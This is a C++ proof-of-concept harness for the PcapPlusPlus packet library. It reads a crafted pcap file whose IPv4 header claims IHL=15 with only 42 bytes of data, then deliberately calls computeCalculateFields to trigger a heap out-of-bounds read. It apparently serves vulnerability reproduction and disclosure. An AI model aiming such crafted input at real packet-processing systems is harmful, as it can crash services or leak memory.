#include <iostream>
#include <fstream>
#include <arpa/inet.h>
#include <PcapFileDevice.h>
#include <Packet.h>
#include <IPv4Layer.h>
#include <SystemUtils.h>
#include <Logger.h>
#include <IpAddress.h>

int main() {
    /* Read the PoC pcap file — crafted packet with IHL=15 but only 42 bytes of IPv4 data */
    pcpp::PcapFileReaderDevice reader("poc_input");
    if (!reader.open()) {
        std::cerr << "Failed to open poc_input" << std::endl;
        return 1;
    }

    pcpp::RawPacket rawPacket;
    while (reader.getNextPacket(rawPacket)) {
        pcpp::Packet parsedPacket(&rawPacket);

        /* Trigger the vulnerable code path */
        parsedPacket.computeCalculateFields();

        /* Also exercise the layer parsing */
        pcpp::IPv4Layer *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
        if (ipLayer) {
            std::cout << "IPv4 header length: " << ipLayer->getHeaderLen() << std::endl;
            std::cout << "IPv4 IHL field: " << (int)(ipLayer->getIPv4Header()->internetHeaderLength) << std::endl;
            std::cout << "IPv4 total length: " << ntohs(ipLayer->getIPv4Header()->totalLength) << std::endl;
            std::cout << "Calling computeCalculateFields on IPv4Layer..." << std::endl;
            ipLayer->computeCalculateFields();
            /* The above call reads (IHL * 4) = 60 bytes from a 42-byte buffer → heap OOB read */
        }
    }

    reader.close();
    std::cout << "Done" << std::endl;
    return 0;
}
